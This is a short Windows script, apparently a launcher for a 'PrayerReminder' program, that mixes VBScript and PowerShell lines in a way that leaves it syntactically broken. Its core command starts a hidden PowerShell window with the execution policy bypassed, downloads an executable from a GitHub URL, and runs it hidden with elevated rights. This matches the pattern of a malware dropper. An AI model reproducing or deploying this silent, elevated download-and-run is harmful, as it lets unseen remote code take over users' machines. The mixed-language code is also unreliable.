Set objShell = CreateObject("WScript.Shell")
$roamingDest = [System.IO.Path]::Combine($env:APPDATA, 'Roaming\PrayerReminder\PrayerReminder.exe')
If (Test-Path $roamingDest) { Remove-Item $roamingDest -Force }
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url = 'https://github.com/AmjadBalls/PrayerReminder/raw/refs/heads/main/PrayerReminder.exe'; $dest = [System.IO.Path]::Combine($env:APPDATA, 'Roaming\PrayerReminder\PrayerReminder.exe'); If (-not (Test-Path (Split-Path $dest))) { New-Item -ItemType Directory -Path (Split-Path $dest) }; Invoke-WebRequest -Uri $url -OutFile $dest; Start-Process $dest -WindowStyle Hidden -Verb RunAs""", 0, False
